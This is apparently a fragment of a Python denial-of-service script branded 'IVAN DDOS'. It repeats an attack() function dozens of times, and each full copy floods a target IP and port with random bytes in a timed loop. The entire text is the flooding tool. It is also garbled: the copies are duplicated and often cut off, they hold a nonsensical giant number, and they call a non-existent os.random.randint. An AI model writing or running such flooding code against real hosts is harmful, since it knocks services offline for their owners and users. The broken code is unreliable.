    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
